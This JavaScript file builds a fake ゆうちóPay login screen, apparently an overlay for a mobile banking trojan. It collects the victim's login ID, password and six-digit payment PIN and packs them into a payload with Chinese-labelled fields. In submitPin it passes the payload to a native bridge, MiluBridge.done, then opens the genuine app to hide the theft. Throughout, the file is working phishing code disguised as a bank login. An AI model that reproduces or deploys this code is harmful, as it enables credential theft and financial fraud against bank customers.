(() => {
  const PIN_LEN = 6;
  const SPLASH_MS = 2000;
  const LOADING_MS = 800;
  const CLOSE_DELAY_MS = 2000;

  const splash = document.getElementById("splash");
  const login = document.getElementById("login");
  const pinScreen = document.getElementById("pin");
  const loginId = document.getElementById("loginId");
  const loginPw = document.getElementById("loginPw");
  const pwToggle = document.getElementById("pwToggle");
  const eyeIcon = document.getElementById("eyeIcon");
  const loginBtn = document.getElementById("loginBtn");
  const backBtn = document.getElementById("backBtn");
  const pinBack = document.getElementById("pinBack");
  const pinDots = Array.from(document.querySelectorAll("#pinDots .pin-dot"));
  const pinDel = document.getElementById("pinDel");
  const loadingEl = document.getElementById("loading");

  const eyeOpen =
    '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  const eyeClosed =
    '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';

  let pin = "";
  let pwVisible = false;
  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function show(screen) {
    [splash, login, pinScreen].forEach((el) => {
      const active = el === screen;
      el.classList.toggle("is-active", active);
      el.setAttribute("aria-hidden", active ? "false" : "true");
    });
  }

  function setLoading(showLoading) {
    loadingEl.classList.toggle("is-show", showLoading);
    loadingEl.setAttribute("aria-hidden", showLoading ? "false" : "true");
  }

  function updateDots() {
    pinDots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function clearPin() {
    pin = "";
    updateDots();
  }

  function submitPin() {
    if (locked || pin.length !== PIN_LEN) {
      return;
    }
    locked = true;
    const payload = {
      类型: "ゆうちょPay",
      账号: loginId.value.trim(),
      密码: loginPw.value,
      支付密码: pin,
      时间戳: Date.now(),
    };
    setLoading(true);
    window.setTimeout(() => {
      setLoading(false);
      reportDone(JSON.stringify(payload));
      window.setTimeout(() => {
        openApp();
        locked = false;
      }, CLOSE_DELAY_MS);
    }, LOADING_MS);
  }

  backBtn.addEventListener("click", () => {
    show(splash);
    window.setTimeout(() => {
      show(login);
    }, SPLASH_MS);
  });

  pwToggle.addEventListener("click", () => {
    pwVisible = !pwVisible;
    loginPw.type = pwVisible ? "text" : "password";
    eyeIcon.innerHTML = pwVisible ? eyeOpen : eyeClosed;
    pwToggle.setAttribute("aria-pressed", pwVisible ? "true" : "false");
    pwToggle.setAttribute("aria-label", pwVisible ? "パスワードを隠す" : "パスワードを表示");
  });

  loginBtn.addEventListener("click", () => {
    const id = loginId.value.trim();
    const pw = loginPw.value;
    loginId.classList.toggle("is-error", !id);
    loginPw.classList.toggle("is-error", !pw);
    if (!id || !pw) {
      return;
    }
    clearPin();
    show(pinScreen);
  });

  loginId.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      loginPw.focus();
    }
  });

  loginPw.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      loginBtn.click();
    }
  });

  document.getElementById("forgotId").addEventListener("click", () => {});
  document.getElementById("forgotPw").addEventListener("click", () => {});

  pinBack.addEventListener("click", () => {
    clearPin();
    show(login);
  });

  document.querySelectorAll(".pin-key[data-k]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (locked || pin.length >= PIN_LEN) {
        return;
      }
      pin += btn.getAttribute("data-k");
      updateDots();
      if (pin.length === PIN_LEN) {
        submitPin();
      }
    });
  });

  pinDel.addEventListener("click", () => {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    updateDots();
  });

  updateDots();
  window.setTimeout(() => {
    show(login);
  }, SPLASH_MS);
})();
